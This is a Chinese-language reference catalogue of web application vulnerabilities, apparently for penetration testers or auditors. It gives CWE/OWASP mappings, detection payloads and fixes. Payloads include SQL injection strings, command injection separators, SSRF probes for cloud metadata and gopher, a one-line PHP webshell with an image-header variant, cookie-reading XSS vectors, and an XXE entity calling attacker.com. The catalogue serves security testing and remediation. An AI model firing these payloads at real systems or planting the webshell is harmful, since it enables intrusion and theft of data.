# Web应用漏洞目录

完整的Web应用漏洞分类与检测方法参考。

## 高危漏洞（P0 - 必须排查）

### 1. SQL注入（SQL Injection）

**CWE**: CWE-89
**OWASP Top 10**: A03:2021

**漏洞原理**：
用户输入被拼接到SQL语句中执行，导致攻击者可以构造恶意SQL语句访问或修改数据库。

**常见类型**：
- 联合注入（Union-based）
- 布尔盲注（Boolean-based blind）
- 时间盲注（Time-based blind）
- 报错注入（Error-based）
- 堆叠注入（Stacked queries）

**检测方法**：
```sql
-- 字符串型
' OR '1'='1
" OR "1"="1
') OR ('1'='1

-- 数字型
1 OR 1=1
1 UNION SELECT NULL--

-- 时间盲注
' AND SLEEP(5)--
1; WAITFOR DELAY '0:0:5'--

-- 报错注入
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--
```

**修复建议**：
- 使用参数化查询（PreparedStatement）
- 使用ORM框架
- 输入验证（白名单）
- 最小权限原则配置数据库账户

---

### 2. 命令执行（Command Injection）

**CWE**: CWE-78
**OWASP Top 10**: A03:2021

**漏洞原理**：
用户输入被拼接到系统命令中执行，导致攻击者可以在服务器上执行任意命令。

**常见场景**：
- Ping功能（传入IP）
- DNS查询
- 文件处理（调用系统命令）
- 框架漏洞（如Struts2）

**检测payload**：
```bash
# Linux
; ls
| whoami
& id
` id `
$(id)
|| sleep 5

# Windows
& dir
| whoami
&& timeout 5
```

**修复建议**：
- 避免调用系统命令，使用语言内置函数
- 白名单校验输入
- 使用参数化执行（如 subprocess with list）

---

### 3. SSRF（Server-Side Request Forgery）

**CWE**: CWE-918
**OWASP Top 10**: A10:2021

**漏洞原理**：
服务端接收用户提供的URL并发起请求，攻击者可利用此访问内网资源、读取本地文件或探测端口。

**常见利用目标**：
- 云元数据服务（169.254.169.254）
- 内网服务（127.0.0.1、192.168.x.x）
- 本地文件（file://）
- 端口探测（dict://）

**检测payload**：
```
http://127.0.0.1
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://0x7f000001
http://2130706433
file:///etc/passwd
file:///c:/windows/win.ini
dict://127.0.0.1:6379
gopher://127.0.0.1:6379
```

**绕过技巧**：
- IP进制转换
- URL编码
- @符号绕过
- DNS rebinding
- 短链接

**修复建议**：
- 白名单目标URL域名
- 禁用危险协议：file://, gopher://, dict://
- 内网隔离
- 解析后再次校验IP是否在黑名单

---

### 4. 未授权访问（Broken Access Control）

**CWE**: CWE-284, CWE-862
**OWASP Top 10**: A01:2021

**漏洞类型**：
- **水平越权**：访问同级别其他用户的数据
- **垂直越权**：普通用户访问管理员功能
- **认证缺失**：关键功能无任何认证

**检测方法**：
- 移除Cookie/Token测试
- 修改ID参数（user_id=100 → user_id=101）
- 直接访问管理URL（/admin、/manager）
- 测试隐藏API端点

**测试场景**：
```
1. 普通用户访问 /api/user/1/profile
2. 普通用户访问 /api/user/2/profile （他人数据）
3. 普通用户访问 /api/admin/config （管理功能）
4. 未登录用户访问 /api/orders （认证缺失）
```

**修复建议**：
- 服务端鉴权检查（不仅依赖前端隐藏）
- 基于角色的访问控制（RBAC）
- 资源所有者校验
- 默认拒绝策略

---

### 5. 文件上传漏洞

**CWE**: CWE-434
**OWASP Top 10**: A04:2021

**漏洞类型**：
- 绕过扩展名限制（.php5、.phtml、.jpg.php）
- 绕过MIME类型检查
- 绕过内容检查（图片马）
- 路径遍历（../）
- 文件解析漏洞（IIS、Nginx解析缺陷）

**检测方法**：
```
# 上传Webshell
test.php  →  <?php system($_GET['c']); ?>
test.php.jpg
test.phtml
test.php5
test.Php

# 路径穿越
test.php;name=test.jpg
/test.php%00.jpg

# 内容绕过
图片文件头 + PHP代码
GIF89a<?php system($_GET['c']); ?>
```

**修复建议**：
- 白名单校验扩展名
- 重命名上传文件
- 存储到非Web目录
- 设置文件权限
- 内容二次校验

---

## 中危漏洞（P1 - 重要排查）

### 6. 存储型XSS（Stored XSS）

**CWE**: CWE-79
**OWASP Top 10**: A03:2021

**漏洞原理**：
恶意脚本被存储到服务端（数据库、文件系统），其他用户访问时触发执行。

**常见场景**：
- 论坛/评论系统
- 用户个人资料
- 邮件/通知内容
- 管理后台展示

**测试payload**：
```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<a href=javascript:alert(1)>click</a>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

**修复建议**：
- 输出HTML实体编码
- CSP（Content Security Policy）
- HttpOnly Cookie
- 输入验证（白名单）

---

### 7. CSRF（Cross-Site Request Forgery）

**CWE**: CWE-352
**OWASP Top 10**: A01:2021

**漏洞原理**：
攻击者诱导已认证用户访问恶意页面，利用用户的身份执行未授权操作。

**测试方法**：
- 移除Referer头重放请求
- 移除CSRF Token重放请求
- 修改请求方法（GET变POST）

**修复建议**：
- CSRF Token
- SameSite Cookie属性
- 验证Referer/Origin
- 重要操作二次验证

---

### 8. IDOR（Insecure Direct Object Reference）

**CWE**: CWE-639

**漏洞原理**：
通过修改直接对象引用参数（如ID）访问未授权资源。

**检测方法**：
```
原请求: GET /api/user/1001/profile
测试:   GET /api/user/1002/profile （他人资料）
```

**修复建议**：
- 服务端权限校验
- 使用不可预测的ID（UUID）
- 间接引用映射

---

### 9. XXE（XML External Entity）

**CWE**: CWE-611
**OWASP Top 10**: A05:2021

**漏洞原理**：
XML解析器处理外部实体引用，导致文件读取、SSRF或命令执行。

**测试payload**：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<data>&xxe;</data>
```

**修复建议**：
- 禁用外部实体解析
- 使用JSON替代XML
- 输入验证

---

## 低危漏洞（P2 - 应排查）

### 10. 反射型XSS

与存储型XSS类似，但payload通过URL参数传递，需诱导用户点击。

### 11. 信息泄露

**类型**：
- 错误信息泄露（堆栈、SQL语句）
- 源码泄露（.git、.svn、.DS_Store）
- 备份文件（.bak、.swp、~）
- 配置文件泄露
- 调试端点暴露（/debug、/actuator）

**检测**：
```
.git/HEAD
.git/config
.svn/entries
.DS_Store
WEB-INF/web.xml
.env
.bash_history
phpinfo.php
server-status
```

### 12. 敏感信息泄露

- 用户名/密码硬编码
- API密钥泄露
- 数据库连接信息泄露
- 加密密钥泄露

---

## 进阶漏洞（专业级）

### 13. 反序列化漏洞

**类型**：Java、PHP、Python、Node.js反序列化

**检测**：
- 识别序列化数据（Java的AC ED 00 05、PHP的O:、Python的pickle）
- 利用工具：ysoserial、PHPGGC

### 14. 逻辑漏洞

- 支付漏洞（负数支付、修改金额）
- 验证码绕过
- 密码重置漏洞
- 并发漏洞（优惠券、抽奖）

### 15. JWT安全问题

- 算法篡改（none、HS256→RS256）
- 密钥泄露
- 过期时间校验缺失

---

## 漏洞优先级矩阵

| 漏洞类型 | 数据敏感度 | 利用难度 | 业务影响 | 综合优先级 |
|---------|----------|---------|---------|-----------|
| SQL注入 | 高 | 低 | 高 | **P0** |
| 命令执行 | 高 | 低 | 极高 | **P0** |
| SSRF | 中-高 | 中 | 高 | **P0** |
| 未授权访问 | 高 | 低 | 高 | **P0** |
| 文件上传 | 高 | 中 | 极高 | **P0** |
| 存储XSS | 中 | 低 | 中 | P1 |
| CSRF | 中 | 中 | 中 | P1 |
| IDOR | 中 | 低 | 中 | P1 |
| XXE | 中 | 中 | 中 | P1 |
| 反射XSS | 低 | 低 | 低 | P2 |
| 信息泄露 | 低 | 低 | 中 | P2 |

---

## 排查建议顺序

1. **认证和授权**：先排查未授权访问和IDOR（最容易发现）
2. **注入类漏洞**：SQL注入、命令注入、SSRF
3. **文件操作**：上传、下载、包含
4. **前端漏洞**：XSS系列、CSRF
5. **配置问题**：信息泄露、默认配置
6. **业务逻辑**：根据业务具体分析

详细payload库参见 `payloads.md`。